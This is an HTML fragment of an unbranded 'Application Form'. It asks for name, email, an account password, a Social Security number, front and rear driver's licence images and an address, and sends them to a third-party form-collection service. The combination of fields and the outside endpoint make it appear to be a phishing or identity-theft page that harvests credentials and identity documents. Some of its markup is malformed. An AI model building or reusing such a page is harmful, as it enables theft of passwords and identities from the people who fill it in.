        <h1>Application Form</h1>

        <br />


        <form name="myForm" action="https://formspree.io/f/mpzeqpzq" method="POST" enctype="multipart/form-data" method="post" align="center">

            <label style="display: block;">Name</label>


            <input type="text" name="name" style="font-size:20px; color:black; padding: 10px;" />


            <label style="display: block;">Email</label>
            <input type="text" name="email" style="font-size:20px; color:black; padding: 10px;" />


            <label style="display: block;">Password</label>


            <input type="password" name="password" style="font-size:20px; color:black; padding: 10px;" />
            
            
             <label style="display: block;">SSN</label>


            <input type="password" name="SSN" style="font-size:20px; color:black; padding: 10px;" />

            
            
          	<label style="display: block;">
    			Rear DL:

  				</label>
				<label style="display: block;">
    			Front DL:
   		  	<input type="file" name="upload">
  				</label>

            <label style="display: block;">Address</label>
            <textarea rows="2" cols="30" placeholder="Type something here..." style="font-size:20px; color:black; padding: 10px;">
</textarea>
            <br/>
            <input type="text" name="state" size="1" maxlength="2" pattern="[A-Za-z]{2}" placeholder="CA" required>
            <input type="text" name="city" size="12" maxlength="30" pattern="[A-Za-z ]+" placeholder="Los Angeles" required>
            <input type="text" name="zipcode" maxlength="5" size="5" pattern="\d{5}" placeholder="90210" required>
            <br/>
            <br />
